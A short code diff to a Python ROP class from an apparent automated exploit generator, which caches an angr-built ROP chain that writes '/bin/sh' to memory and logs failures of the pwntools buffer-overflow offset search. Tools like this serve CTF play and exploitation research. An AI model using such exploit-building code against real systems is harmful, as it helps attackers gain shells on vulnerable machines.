@@ -20,14 +20,17 @@ class ROP:
         self.p = p
 
         self.fart_print.info("Buffer overflow likely!")
+        self.cache_angrop = b''
 
     def write_binsh_to_mem(self):
-        angr_proj = angr.Project(self.analysis.binary)
-        angr_rop  = angr_proj.analyses.ROP()
-        angr_rop.find_gadgets_single_threaded() 
-        #angr_rop.find_gadgets()
-        self.analysis.hbsh = True
-        return angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
+        if self.cache_angrop == b'':
+            angr_proj = angr.Project(self.analysis.binary)
+            angr_rop  = angr_proj.analyses.ROP()
+            angr_rop.find_gadgets_single_threaded() 
+            #angr_rop.find_gadgets()
+            self.analysis.hbsh = True
+            self.cache_angrop = angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
+        return self.cache_angrop
     
     def build_exploit(self, failed=False):
         self.fart_print.info("Attempting to discover the constraints to exploiting the buffer overflow")
@@ -69,6 +72,7 @@ class ROP:
             offset = cyclic_find(core.read(core.rsp, 8), n=8)
             return b'A'*offset
         except PwnlibException as e:
+            print(e)
             self.fart_print.warning("Dynamic overflow failed! Attempting symbolic analysis")
             return Get2overflow(self.filename, self.v_lvl).buf()
 
